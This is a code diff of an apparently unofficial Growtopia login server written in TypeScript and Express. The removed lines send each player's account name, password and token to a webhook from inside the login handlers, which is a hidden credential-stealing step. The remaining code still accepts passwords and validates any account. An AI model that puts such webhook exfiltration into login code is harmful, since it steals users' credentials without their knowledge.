@@ -154,8 +154,6 @@ App.post('/player/login/dashboard', (req: Request, res: Response) => {
     const Data = Device.Packet(Context);
     const Token = Parsing.Encode(JSON.stringify(Data));
     
-    Webhook.Send(req, Data['tankIDname'], Data['tankIDPass'], Token);
-
     return res.send(Growtopia.Bypass(Data['tankIDName'] || '', Data['tankIDPass'] || '', Token));
 });
 
@@ -186,22 +184,19 @@ App.post('/player/growid/checktoken', (_req, res) => {
 });
 
 App.post('/player/growid/validate/checktoken', (req: Request, res: Response) => {
-    const Context = (req as any).rawBody || '';
-    const Data = Device.Packet(Context);
-    const Token = Parsing.Encode(JSON.stringify(Data));
+    const raw = (req as any).rawBody || '';
+    const data = Device.Packet(raw);
 
-    const result = {
+    const token = Buffer.from(JSON.stringify(data)).toString('base64');
+
+    res.send(JSON.stringify({
         status: 'success',
         message: 'Account Validated.',
-        Token,
+        token,
         url: '',
         accountType: 'growtopia',
         accountAge: 2,
-    };
-
-    Webhook.Send(req, Data['tankIDname'] || '', Data['tankIDPass'] || '', Token);
-
-    Growtopia.Send(req, res, result, true);
+    }));
 });
 
 App.listen(Port, () => {
